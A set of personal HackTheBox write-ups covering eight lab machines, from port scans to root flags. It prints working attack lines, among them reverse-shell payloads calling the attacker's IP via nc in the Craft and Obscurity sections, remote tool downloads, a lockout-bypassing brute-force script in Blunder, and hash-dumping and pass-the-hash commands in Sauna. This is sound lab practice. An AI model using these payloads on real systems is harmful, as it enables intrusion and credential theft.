# This is where my writeups for hackthebox will go!

Hackthebox is a website where people upload vulnerable machines for people to hack into. Most of these will test one or two skills or specific vulnerabilities but doing many will give hackers a large understanding of various ways someone may be able to hack into a machine, whilst also making them aware of current exploits that may be on their own systems. 

At the time of writing, I have "Owned" <ins> 18 users </ins> and <ins> 13 systems </ins>

User owns means that I obtained a user flag... essentially, I managed to get access to the account of a normal user on the target machine. 
System own means that I obtained a root flag... where I have admin privileges on the machine. This is the end goal for all hackthebox machines and allows complete control of the system.


* [Craft](#craft-writeup)
* [Heist](#heist-writeup)
* [Mango](#mango-writeup)
* [Obscurity](#obscurity-writeup) 
* [OpenAdmin](#openadmin-writeup)
* [Registry](#registry-writeup)
* [Sauna](#sauna-writeup)
* [Blunder](#blunder-writeup)

## Craft Writeup:

One of my favourite machines so far on hackthebox! This felt like a proper hack with custom exploits and having to be able to understand the system before exploting it.
The custom API forces you to look for things that could be vulnerable. This box is medium difficulty.

### Port scan:
`PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) 443/tcp open ssl nginx 1.15.8 6022/tcp open ssh (protocol 2.0) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port6022-TCP:V=7.80%I=7%D=11/21%Time=5DD6F159%P=x86_64-pc-linux-gnu%r(N SF:ULL,C,"SSH-2.0-Go\r\n"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

So we know that it's Running nginx 1.15.8 On port 6022, ssh 2.0-go

 https://10.10.10.110/ --> get webpage

check certificate --> craft.htb API link goes to api.craft.htb URL

Your system will check the hosts file first before looking up a site on the DNS servers defined in your network settings

Edit /etc/hosts.txt to have 10.10.10.110 api.craft.htb

Click API link again, taken to API page. Other link on home page top right is gogs.craft.htb Add gogs.craft.htb to hosts file

https://api.craft.htb/api/brew/ https://api.craft.htb/api/auth/login needs password

In repo https://gogs.craft.htb/Craft/craft-api/compare/4fd8dbf8422cbf28f8ec96af54f16891dfdd7b95...10e3ba4f0a09c778d7cec673f28d410b73455a86

auth=('dinesh', '4aUh0A8PbVJxgd')

Try in /auth/login...

`{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc0MzcxMDExfQ.hbUYCLi6US-Ka911usBo9BL4C5p87VRQAKx3jv9CJsM"}`

https://api.craft.htb/api/auth/check makes sure token is valid...

Can use login page to login as dinesh.

https://gogs.craft.htb/Craft/craft-api/issues/2

`curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'`

could use token from earlier??

https://gogs.craft.htb/Craft/craft-api/src/master/tests/test.py

use test.py, add login from earlier to code... Get rid of warnings with

import urllib3 urllib3.disable_warnings()

when a user is able to provide the input, eval() will execute anything that's feeded to it. A user could build a string where additional python code is executed, such as erasing all files on the system or spawning a reverse shell. Therefore, eval()should never be used to process user input.

https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6

### We can use eval function to run our own malicious code on the server!!
```python 
make sure the ABV value is sane.
    if eval('%s > 1' % request.json['abv']):
        return "ABV must be a decimal value less than 1.0", 400
    else:
        create_brew(request.json)
        return None, 201 
 ```
We can then use this bit of code to open a reverse shell...

     
`brew_dict['abv'] = "import('os').system('nc 10.10.15.75 1234 -e /bin/sh')"`

> nc -nvlp 1234

Drop shell!!!!!

cd /opt/app/craft_api cd /opt/app run dbtest.py

`{'id': 12, 'brewer': '10 Barrel Brewing Company', 'name': 'Pub Beer', 'abv': Decimal('0.050')}`

can't edit dbtest, use simplehttp server to upload an edited file...

on your kali : python -m SimpleHTTPServer 5555 on your target box: wget http://ip/filename

python -m SimpleHTTPServer 5555 wget http://10.10.15.75:5555/dbtestME.py

edit dbtest.py so sql = "SELECT database()" Run edited code... {'database()': 'craft'}

sql = "SELECT *FROM user" {'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}

result = cursor.fetchone() --> result = cursor.fetchall()

`[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]`

log in to gogs as gilfoyle

id_rsa file...

use id_rsa and pass for gilfoyle to ssh in

ssh -i hash gilfoyle@10.10.10.110

### USER FLAG

cd /usr/local/bin vault file... The Vault SSH secrets engine provides secure authentication and authorization for access to machines via the SSH protocol.

https://gogs.craft.htb/gilfoyle/craft-infra/commit/72bd340e48bd5565fd6c388deb124f39a93d5879

root OTP set

https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html

An authenticated client requests credentials from the Vault server and, If authorized, is issued an OTP. An attacker could spoof the Vault server returning a successful request.

/usr/local/bin$ vault write ssh/creds/root_otp ip=10.10.10.110 key 15f433c1-fb4f-7917-e6a5-e180d6d7bf3d

ssh into box with key as password

### ROOT FLAG



I completed this box during my first semester and it was the most challenging and engaging yet. The ones that I have done at the time of writing are a bit harder and some just as interesting which I will upload soon!


## Heist Writeup:

This is one of the first windows machines I hacked and was a great learning experience. From this, I learnt of tools that would help me in future machines.

`PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49669/tcp open msrpc Microsoft Windows RPC`

http://10.10.10.149/login.php login as guest

http://10.10.10.149/attachments/config.txt Cisco router config^^^

> gobuster dir -e -u http://10.10.10.149/ -w /usr/share/wordlists/dirb/common.txt

`http://10.10.10.149/attachments (Status: 301) http://10.10.10.149/css (Status: 301) http://10.10.10.149/images (Status: 301) http://10.10.10.149/Images (Status: 301) http://10.10.10.149/index.php (Status: 302) http://10.10.10.149/js (Status: 301)`

One username on windows server is Hazard... hostname ios-1

Crack cisco passwords with john:

enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91---> stealth1agent

Cisco type 7 password cracker --> http://www.ifm.net.nz/cookbooks/passwordcracker.html

username rout3r password 7 0242114B0E143F015F5D1E161713--> $uperP@ssword

username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 -- > Q4)sJu\Y8qz*A3?d

A SID, short for security identifier, is a number used to identify user, group, and computer accounts in Windows.

lookupsid.py: This script allows you to bruteforce the Windows SID, aiming at finding remote users/groups.

https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/

get impacket here: https://github.com/SecureAuthCorp/impacket/tree/master/examples

./lookupsid.py hazard@10.10.10.149 use password > stealthagent

`500: SUPPORTDESK\Administrator (SidTypeUser) 501: SUPPORTDESK\Guest (SidTypeUser) 503: SUPPORTDESK\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\None (SidTypeGroup) 1008: SUPPORTDESK\Hazard (SidTypeUser) 1009: SUPPORTDESK\support (SidTypeUser) 1012: SUPPORTDESK\Chase (SidTypeUser) 1013: SUPPORTDESK\Jason (SidTypeUser)`

> evil-winrm -i 10.10.10.149 -u Chase -p "Q4)sJu\Y8qz*A3?d" DROP SHELL! (powershell)

cd Desktop

### USER FLAG!!

Get-Process --procdump and sysinternals...

psexec... use simplehttpserver to upload .exe to machine...

$client = new-object System.Net.WebClient $client.DownloadFile(“http://10.10.14.182:8000/PSTools/PsExec.exe”,“C:\Users\Chase\Documents\PsExec.exe”) same for procdump.exe

firefox.exe process procdump -ma firefox.exe...dmp download C:\Users\Chase\Videos /root

strings .dmp file | grep 'admin'

Password = 4dD!5}x/re8]FBuZ

> evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'

### ROOT FLAG!!

## Mango Writeup:

`PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

Go to http://10.10.10.162:443/

Bad request... You're speaking plain HTTP to an SSL-enabled server port. Instead use the HTTPS scheme to access this URL, please.

Type https://10.10.10.162/ instead

Search engine ting

Signed in as MrR3boot

Connect > elasticsearch > go to url

gobuster on url: https://olap.flexmonster.com/aspnet_client (Status: 301) https://olap.flexmonster.com/crossdomain.xml (Status: 200)

IIS ver 8.5... There is sign in page: https://login.iis.net/account/login?ReturnUrl=https://www.iis.net/

Go to crossdomain.xml... allows http request headers from anyone.

Certificate --> staging-order.mango.htb

hosts file --> 10.10.10.162 staging-order.mango.htb

get login page!

gobuster:

`http://staging-order.mango.htb/.htaccess (Status: 403) http://staging-order.mango.htb/.hta (Status: 403) http://staging-order.mango.htb/.htpasswd (Status: 403) http://staging-order.mango.htb/index.php (Status: 200) http://staging-order.mango.htb/server-status (Status: 403) http://staging-order.mango.htb/vendor (Status: 301)`

Search for mango DB injection

mongo db Mongo is a NoSQL database

NOSQL injection

https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration

`python3 enum.py -u http://staging-order.mango.htb -m POST -up username -pp password -op login:login -ep username`

Download zip from github and run in its folder for it to work!

Found users 'admin' and 'mango'

Run command again with -ep as 'password'

Found passwords 'h3mXK8RhU~f{]f5H' and 't9KcS3>!0B#2', pass for mango and admin

Logging in with admin and t9KcS3>!0B#2 gives us under construction page... DEAD END

SSH into machine with mango and pass h3mXK8RhU~f{]f5H Run linEnum... SUID and GUID file at /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs

su to admin with other password GET USER FLAG!

Check out jjs... GTFO BINS--> It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

Run jjs at exact file path...

Run this in terminal: `echo 'var BufferedReader = Java.type("java.io.BufferedReader"); var FileReader = Java.type("java.io.FileReader"); var br = new BufferedReader(new FileReader("/root/root.txt")); while ((line = br.readLine()) != null) { print(line); }' | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs`

### Get root flag!!!


## Obscurity Writeup:

`PORT STATE SERVICE 22/tcp open ssh 80/tcp closed http 8080/tcp open http-proxy 9000/tcp closed cslistener`

"Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory"

`wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py`

Found "develop" directory.

http://10.10.10.168:8080/develop/SuperSecureServer.py

Uses exec function in serveDoc function!

`path = urllib.parse.unquote(path) try: info = "output = 'Document: {}'" exec(info.format(path))`

exploit code found here:

https://drive.google.com/file/d/13VyZ0fa32tKhzuieee3EVMeddK3Vpycz/view OR

http://10.10.10.168:8080/%27;os.system(%22rm /tmp/f ; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1|nc 10.10.14.135 12345 > /tmp/f");#

IN URL

URL ENCODE THE PAYLOAD

Get www-data... snapcraft is used?

Dirty sock vyln for snapd API...

Interesting files in /home/robert dir!

Download check.txt, crypt.py file, out.txt and passwordreminder.txt

python3 SuperSecureCrypt.py -i out.txt -o first_key.txt -k "Encrypting this file with your key should result in out.txt, make sure your key is correct!" -d

Outputs alexandrovich

python3 crypt.py -i passwordreminder.txt -o second_key.txt -k "alexandrovich" -d

Outputs SecThruObsFTW

### SSH login with robert and SecThruObsFTW Get user!

sudo -l User robert may run the following commands on obscure: (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py

with open('/etc/shadow', 'r') as f: data = f.readlines() data = [(p.split(":") if "$" in p else None) for p in data] passwords = [] for x in data: if not x == None: passwords.append(x)

passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) with open('/tmp/SSH/'+path, 'w') as f: f.write(passwordFile)

Copies contents of shadow file to /tmp/SSH file!

It deletes it after authentication occurs though... hmmm... Directory is also randomized each time.

watch -n 0.1 cat /tmp/SSH/* Log into better ssh in different window...

Still too fast to see. watch -n .1 cp /tmp/SSH/* /dev/shm

get root hash!

Crack with john...

Password is mercedes

SSH in with pass mercedes

### Root flag!

## OpenAdmin Writeup:

`PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`


Look up ip on browser, get default apache page.
>gobuster dir -e -u http://10.10.10.171/ -w /usr/share/wordlists/dirb/common.txt


`http://10.10.10.171/.hta (Status: 403)
http://10.10.10.171/.htpasswd (Status: 403)
http://10.10.10.171/.htaccess (Status: 403)
http://10.10.10.171/artwork (Status: 301)
http://10.10.10.171/index.html (Status: 200)
http://10.10.10.171/music (Status: 301)
http://10.10.10.171/server-status (Status: 403)`


/artwork looks interesting... 
Blog has posts made by 'Admin'

COuldnt find much, check /music dir.
Login as guest.
openadmin.htb is DNS domain.

something called opennet admin
Look up vulns for it...
Your version    = v18.1.1

Found bash script here:
https://www.exploit-db.com/exploits/47691

Download and run, specify url and get www-data shell!
Wont let me change directory... I can still view directories though!

Users jimmy and joanna...
Search for passwd keyword to see if there are any values we can find...

>grep -Ri passwd
'db_passwd' => 'n1nj4W4rri0R!'

Try ssh in users with this password...
SSH worked with user jimmy.

`jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>`



curl http://127.0.0.1/main.php
`<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80</address>
</body></html>`

Check other open ports on machine...

>netstat -tulpn

try curl on port 52846...
Get rsa key!

ssh2john --> john --> get password

Password is bloodninjas :)
ssh -i rsaKey joanna@10.10.10.171
Need rsaKey file and password to log in!

### Get user! :)



>sudo -l

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv


sudo -u root /bin/nano /opt/priv

GTFO BINS --> nano
exploit nano according to gtfobins. 

### Get root flag!

## Registry Writeup:

This was the first hard difficulty box that I did! It taught me a bit about docker containers and to be careful what you back up! 


Get welcome page when i visit ip... "Welcome to nginx" 
It's running nginx 1.14.0


`PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp   open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp  open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
1234/tcp open  hotline?`


Go to https website, view certificate, domain is docker.registry.htb.
Add to hosts file...

>gobuster dir -e -k -u https://10.10.10.159/ -w /usr/share/wordlists/dirb/common.txt

`
https://10.10.10.159/.hta (Status: 403)
https://10.10.10.159/.bash_history (Status: 403)
https://10.10.10.159/.htaccess (Status: 403)
https://10.10.10.159/.htpasswd (Status: 403)
https://10.10.10.159/index.html (Status: 200)
https://10.10.10.159/install (Status: 301)
`

Interesting text in /install ...
Judging by commonName, docker could be used...

Go to docker.registry.htb and enumerate directories, find /v2.

/v2 is login page... login with admin and admin. Has nothing in it.

gobuster on /v2:

`
https://docker.registry.htb/v2/http%3A%2F%2Fwww (Status: 301)
https://docker.registry.htb/v2/http%3A%2F%2Fyoutube (Status: 301)
https://docker.registry.htb/v2/http%3A%2F%2Fblogs (Status: 301)
https://docker.registry.htb/v2/http%3A%2F%2Fblog (Status: 301)
https://docker.registry.htb/v2/**http%3A%2F%2Fwww (Status: 301)
https://docker.registry.htb/v2/http%3A%2F%2Fcommunity (Status: 301)
https://docker.registry.htb/v2/http%3A%2F%2Fradar (Status: 301)
https://docker.registry.htb/v2/http%3A%2F%2Fjeremiahgrossman (Status: 301)
https://docker.registry.htb/v2/http%3A%2F%2Fweblog (Status: 301)
https://docker.registry.htb/v2/http%3A%2F%2Fswik (Status: 301)`


https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/

Install docker on local machine.

In https://docker.registry.htb/v2/_catalog
"bolt-image" found.

Go to https://docker.registry.htb/v2/bolt-image/tags/list

There is only 1 tag, "latest".
Therefore, can download manifests file from https://docker.registry.htb/v2/bolt-image/manifests/latest

Download each blob from the lists of blobs like this:

https://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b


Unzip blobs and have a look inside...

Need to rename file to have .gz so i can gunzip it correctly...

!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact


Can also do it by logging in through docker and pulling the images... images can also be directories!!!

>docker login http://docker.registry.htb/


Fix self signed cert issue:
>nano /usr/lib/systemd/system/docker.service 

ExecStart=/usr/sbin/dockerd -H fd:// $DOCKER_OPTS --insecure-registry=docker.registry.htb

>sudo systemctl daemon-reload
>sudo systemctl restart docker

Login then 
>docker pull docker.registry.htb/bolt-image

>cd /var/lib/docker/overlay2

Look through dirs...
In /var/lib/docker/overlay2/l/6ESXULLQXTZKXNA7UTM6MQJ3QC/root/.ssh
Found id_rsa file and we have the password for it too!

SSH in as bolt with rsa_id file and password...

Use GkOcz221Ftb3ugog as password.

### Get user flag!!!


/usr/bin/traceroute6.iputils  has SUID bit set.


Bolt directory found at /home/bolt/.cache/composer/files/bolt/


Login page found at https://10.10.10.159/bolt/bolt/login
SCAN WITH GOBUSTER ON MEDIUM WORDLIST!


Bolt.db file found in /var/www/html/bolt/app/database

is sqlite database file.

Base64, copyt to local machine and decode...

Online sqlite viewer.

SELECT * FROM 'bolt_users' LIMIT 0,30

Got username 'admin'

password '$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK'

Use john to crack the hash, got password 'strawberry'

Login with those creds.
It's an admin dashboard...

Add .php files to allowed file types in config.
Upload p0wnyshell, open file in browser.

Files keep getting deleted every minute or so... 

Drops shell as www-data!

>sudo -l

(root) NOPASSWD: /usr/bin/restic backup -r rest*


Uses restic... restic is a backup program
Rest Server is a high performance HTTP server that implements restic's REST backend API. 

Install them both and create a repo with restic.

>restic init --repo /tmp/backup

Then run rest-server on local machine.

>./rest-server --path /tmp/backup --no-auth

Do ssh remote port forward with same port as rest-server on bolt user:

>ssh -R 22:127.0.0.1:8000 bolt@10.10.10.159 -i id_rsa

Go back to www-data shell and get root backup.

Append --files-from /root/root.txt to command.

>/usr/bin/restic backup -r rest* --files-from /root/root.txt 

sudo /usr/bin/restic backup -r rest* --files-from /root/root.txt
/var/www/html/bolt/files/ntrkzgnkotaxyju0ntrinda4yzbkztgw does not exist, skipping
Fatal: all target directories/files do not exist


### ntrkzgnkotaxyju0ntrinda4yzbkztgw is root flag!

## Sauna Writeup:

This was an interesting one as it taught me about active directory attacks. A lot of times you can guess usernames of employees on an active directory! 

`PORT STATE SERVICE VERSION 53/tcp open domain? 80/tcp open http Microsoft IIS httpd 10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-02-20 03:37:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped`

Gobuster got nothing...

Research active directory attacks

User 1:

OSINT on website
Common corporate username naming convention in AD
tool in your pocket
User 2:

Manual windows enumeration
check AllTheThings
Root:

ask another tool in same pocket to dump the things
just pass through the door
https://www.tarlogic.com/en/blog/how-to-attack-kerberos/

Use kerbrute with list of possible usernames to get passwords...

Found possible usernames at http://10.10.10.175/about.html

Use different combinations of first and last name.

Set 10.10.10.175 EGOTISTICAL-BANK.LOCAL0 in hosts file.

`./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL ~/kerbrute/user_file --dc 10.10.10.175`

2020/02/27 11:25:48 > [+] VALID USERNAME: fsmith@EGOTISTICAL-BANK.LOCAL 2020/02/27 11:25:48 > [+] VALID USERNAME: FSmith@EGOTISTICAL-BANK.LOCAL 2020/02/27 11:25:48 > [+] VALID USERNAME: Fsmith@EGOTISTICAL-BANK.LOCAL

Now use getNPUsers with username...

`python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -dc-ip 10.10.10.175 Get hash:

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c512506f70a474bf1ee211599cc842aa$1e1576e9d52d9fffeb9c0b9ae6da6d31ed67f80a318b3196de147ac81ef39a7513f32913faa548dbaebdbccdef0a6aca5068fb6c6f9f4c7abb1ecf8f236d6a0fd3488f9904d2705b6ea53a79a500b0a83f339a823209859cd5bf0aded75eec8894da57a2f83a3107f58f217ad51e550c34bf416d557e67726b5ce8aae8f6a0cb2af2876171154c975d0bdc39ef2b9b5a839d60490ef5671bf00a166e7e36b23b721e545fdda393c3ca0bd368d87c1414bb6a7350416015d67899aac82ccb92cc1aa378b66d60b4e1273d6edeaee01c4f162abdd923120fa9d0e61d988efa134f663dd84795a21a52d82f79a37cf20e21e35a78876fbece1b8a14d49b4d139dfb`

John --> get password, $fsmith@EGOTISTICAL-BANK.LOCAL:Thestrokes23

`evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'`

Get shell! GET USER FLAG!!

Run winpeas in user desktop...

DefaultDomainName : EGOTISTICALBANK DefaultUserName : EGOTISTICALBANK\svc_loanmanager DefaultPassword : Moneymakestheworldgoround!

`evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`

Get 2nd user...

secretsdump.py in impacket dumps hashes from remote machine...

`python secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@EGOTISTICAL-BANK.LOCAL -target-ip 10.10.10.175`

Get NTDS.DIT secrets:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::

Evil winrm with admin hash

`evil-winrm -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff`

### Get root flag! :)

## Blunder Writeup:

This is the most recent box that I have done, root was pretty standard but I learnt of some new tools such as cewl that will be very useful in the future.
`PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))`


In robots.txt:

User-agent: *
Allow: /


Using gobuster:
`
http://10.10.10.191/.hta (Status: 403)
http://10.10.10.191/.htaccess (Status: 403)
http://10.10.10.191/.htpasswd (Status: 403)
http://10.10.10.191/0 (Status: 200)
http://10.10.10.191/about (Status: 200)
http://10.10.10.191/admin (Status: 301)
http://10.10.10.191/cgi-bin/ (Status: 301)
http://10.10.10.191/LICENSE (Status: 200)
http://10.10.10.191/robots.txt (Status: 200)
http://10.10.10.191/server-status (Status: 403)
`


http://10.10.10.191/admin/ has login page.

Uses bludit...

After a few tries ip is blocked and have to try again in a few minutes... way to bypass this?

take a look at bludit docs...
Brute force protection section in security tab.

There is a Security Object called $security, and the class of the object is /bl-kernel/security.class.php. Take a look at the variables inside the class.


`private $dbFields = array(
    'minutesBlocked'=>5,
    'numberFailuresAllowed'=>10,
    'blackList'=>array());

    minutesBlocked: Amount of minutes the IP is going to be blocked.
    numberFailuresAllowed: Number of failed attempts for the block to trigger.
    blackList: The list of IPs blocked.
`
    
I think it's running bludit 3.9.2

Look up CVE of bludit 3.9.2

Code execution vulnerability found.
Also a brute force attack bypass vulnerability!

Bludit adds your IP address to the X-Forwarded-For header tag to the login request that you send to the web server and using this method it keeps count of the requests that you make to the web application.
"using unique X-Forwarded-For addresses for each request. As there is no validation, simply using the value of the password being attempted will work, allowing for a brute force without the risk of locking anyone out at all"



todo.txt found with wfuzz:
`wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://10.10.10.191/FUZZ.txt" -t 100`

someone named "fergus" mentioned. try using that as username.


use cewl to generate wordlist:

`cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191/`

CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.
```python
import re
import requests
#from __future__ import print_function

def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = open_ressources('/root/hackthebox/blunder/wordlists.txt')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break

```


SUCCESS: Password found!
Use fergus:RolandDeschain to login.

code execution vuln found here:
https://github.com/bludit/bludit/issues/1081


can use msf to do it quickly.

`msf5 > use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) > set TARGET 0
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOST 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > set RPORT 80
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > exploit`

Once meterpreter opens use "shell" command to spawn a shell on the machine.
We got www-data.

Make it easier for us by spawning a terminal with:
python -c "import pty;pty.spawn('/bin/bash')"

in /var/www/bludit-3.9.2/bl-content/databases

cat users.php

Find passwords and usernames...
`<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
`

also in /var/www/bludit-3.10.0a/bl-content/databases
`
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
